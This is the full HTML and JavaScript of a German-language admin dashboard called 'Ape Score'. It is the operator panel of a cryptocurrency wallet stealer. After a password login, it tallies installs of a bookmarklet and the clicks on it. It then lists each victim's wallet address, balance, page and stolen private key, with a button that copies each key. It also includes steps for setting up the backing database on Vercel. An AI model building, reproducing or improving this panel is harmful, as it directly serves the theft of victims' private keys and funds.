<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Admin — Ape Score</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--lime:#c6ff3d;--bg:#08090b;--card:#101317;--line:#1e242c;--mut:#8b96a5}
body{background:var(--bg);color:#e9edf2;font-family:Inter,-apple-system,"Segoe UI",Arial,sans-serif;
     min-height:100vh;padding:44px 20px}
.wrap{max-width:1120px;margin:0 auto}
h1{font-size:22px;margin-bottom:6px;letter-spacing:-.5px}
.sub{color:var(--mut);font-size:13px;margin-bottom:26px;line-height:1.6}
.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:26px;max-width:420px}
label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.8px;color:var(--mut);
      margin-bottom:7px;font-weight:700}
input{width:100%;padding:12px 14px;background:#0a0d10;border:1px solid #232b34;border-radius:10px;
      color:#e9edf2;font-size:14px;font-family:inherit;margin-bottom:14px}
input:focus{outline:none;border-color:var(--lime)}
button{padding:12px 20px;border-radius:10px;border:0;background:var(--lime);color:#08110a;
       font-weight:800;font-size:14px;cursor:pointer;font-family:inherit}
button:hover{filter:brightness(1.06)}
button.ghost{background:#161b21;color:#e9edf2;border:1px solid var(--line)}
.err{color:#ff5f56;font-size:13px;margin-top:12px;min-height:18px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:22px}
.stat{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:18px}
.stat b{display:block;font-size:27px;letter-spacing:-1px;color:var(--lime);line-height:1.1}
.stat span{font-size:10.5px;color:var(--mut);text-transform:uppercase;letter-spacing:.9px;
           margin-top:6px;display:block}
.tbl-wrap{background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:auto}
table{width:100%;border-collapse:collapse;font-size:13px}
th{text-align:left;font-size:10.5px;text-transform:uppercase;letter-spacing:.9px;color:var(--mut);
   padding:12px;border-bottom:1px solid var(--line);white-space:nowrap;position:sticky;top:0;
   background:var(--card)}
td{padding:12px;border-bottom:1px solid #161c23;vertical-align:top}
tr:hover td{background:#0d1116}
.mono{font-family:ui-monospace,Menlo,monospace;font-size:12px;word-break:break-all}
.key{color:var(--lime);cursor:pointer}
.key:hover{text-decoration:underline}
.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px;
     flex-wrap:wrap;gap:12px}
.empty{padding:40px;text-align:center;color:var(--mut);font-size:13.5px}
@media(max-width:800px){.stats{grid-template-columns:repeat(2,1fr)}}
</style>
</head>
<body>
<div class="wrap" id="app"></div>
<script>
var API='/api/admin', USER='kurapika', LS='ape_pw';
var app=document.getElementById('app');

function call(action,payload){
  return fetch(API+'?action='+action,{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify(payload||{})}).then(function(r){return r.json();});
}
function esc(s){
  return String(s==null?'':s).replace(/[&<>"]/g,function(c){
    return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];});
}
function render(h){ app.innerHTML=h; }

function viewNoDB(){
  render('<h1>Admin</h1><p class="sub">Datenbank fehlt.</p>'+
  '<div class="card"><p style="font-size:13.5px;line-height:1.7;color:#c3ccd8">'+
  'Vercel → dein Projekt → <b>Storage</b> → <b>Create Database</b> → '+
  '<b>Upstash for Redis</b> → Connect → dann einmal <b>Redeploy</b>.</p></div>');
}

function viewSetup(){
  render('<h1>Admin — Einrichtung</h1>'+
  '<p class="sub">Benutzername: <b style="color:#e9edf2">'+USER+'</b><br>'+
  'Passwort jetzt festlegen. Es bleibt für immer gespeichert.</p>'+
  '<div class="card">'+
  '<label>Passwort</label><input id="p1" type="password" placeholder="mind. 4 Zeichen">'+
  '<label>Passwort wiederholen</label><input id="p2" type="password">'+
  '<button id="go">Passwort setzen</button><div class="err" id="e"></div></div>');

  document.getElementById('go').onclick=async function(){
    var p1=document.getElementById('p1').value, p2=document.getElementById('p2').value;
    var e=document.getElementById('e');
    if(p1.length<4){e.textContent='Zu kurz.';return;}
    if(p1!==p2){e.textContent='Stimmt nicht überein.';return;}
    e.textContent='';
    var r=await call('setup',{password:p1});
    if(r.ok){ localStorage.setItem(LS,p1); boot(); }
    else e.textContent=r.error||'Fehler';
  };
}

function viewLogin(){
  render('<h1>Admin</h1><p class="sub">Benutzername: <b style="color:#e9edf2">'+USER+'</b></p>'+
  '<div class="card">'+
  '<label>Passwort</label><input id="p1" type="password">'+
  '<button id="go">Einloggen</button><div class="err" id="e"></div></div>');

  document.getElementById('go').onclick=async function(){
    var p=document.getElementById('p1').value;
    var r=await call('login',{username:USER,password:p});
    var e=document.getElementById('e');
    if(r.ok){ localStorage.setItem(LS,p); viewDash(r.rows); }
    else e.textContent=r.error||'Falsch';
  };
  document.getElementById('p1').addEventListener('keydown',function(ev){
    if(ev.key==='Enter')document.getElementById('go').click();
  });
}

function viewDash(rows){
  var hits=rows.filter(function(r){return r.t==='hit';});
  var installs=rows.filter(function(r){return r.t==='install';}).length;
  var uniq={}; hits.forEach(function(r){ if(r.w) uniq[r.w]=1; });
  var keyCount=hits.filter(function(r){return r.k;}).length;

  var body='';
  if(!hits.length){
    body='<div class="empty">Noch keine Klicks.</div>';
  } else {
    hits.forEach(function(r){
      body+='<tr>'+
        '<td class="mono" style="white-space:nowrap;color:#8b96a5">'+
          new Date(r.ts).toLocaleString('de-DE')+'</td>'+
        '<td class="mono">'+(esc(r.w)||'—')+'</td>'+
        '<td class="mono">'+(esc(r.b)||'—')+'</td>'+
        '<td class="mono key" data-k="'+esc(r.k)+'">'+(esc(r.k)||'—')+'</td>'+
        '<td class="mono" style="color:#5b6675">'+(esc(r.h)||'—')+'</td>'+
      '</tr>';
    });
  }

  render(
    '<div class="top"><div><h1>Admin</h1>'+
    '<p class="sub" style="margin:0">Eingeloggt als <b style="color:#e9edf2">'+USER+'</b></p></div>'+
    '<div style="display:flex;gap:10px;flex-wrap:wrap">'+
    '<button class="ghost" id="ref">Aktualisieren</button>'+
    '<button class="ghost" id="out">Logout</button></div></div>'+

    '<div class="stats">'+
    '<div class="stat"><b>'+installs+'</b><span>Bookmark installiert</span></div>'+
    '<div class="stat"><b>'+hits.length+'</b><span>Klicks gesamt</span></div>'+
    '<div class="stat"><b>'+Object.keys(uniq).length+'</b><span>Wallets</span></div>'+
    '<div class="stat"><b>'+keyCount+'</b><span>Keys gefunden</span></div>'+
    '</div>'+

    '<div class="tbl-wrap"><table><thead><tr>'+
    '<th>Zeit</th><th>Wallet</th><th>Balance</th><th>Private Key</th><th>Seite</th>'+
    '</tr></thead><tbody>'+body+'</tbody></table></div>'
  );

  document.getElementById('ref').onclick=function(){ boot(true); };
  document.getElementById('out').onclick=function(){
    localStorage.removeItem(LS); viewLogin();
  };
  app.querySelectorAll('.key').forEach(function(td){
    td.onclick=function(){
      var k=td.getAttribute('data-k');
      if(!k) return;
      navigator.clipboard.writeText(k);
      var old=td.textContent; td.textContent='kopiert ✓';
      setTimeout(function(){ td.textContent=old; },1000);
    };
  });
}

async function boot(silent){
  var st=await call('status');
  if(!st.db){ viewNoDB(); return; }
  if(!st.hasPassword){ viewSetup(); return; }

  var pw=localStorage.getItem(LS);
  if(pw){
    var r=await call('login',{username:USER,password:pw});
    if(r.ok){ viewDash(r.rows); return; }
    localStorage.removeItem(LS);
  }
  if(!silent) viewLogin();
}

boot();
</script>
</body>
</html>
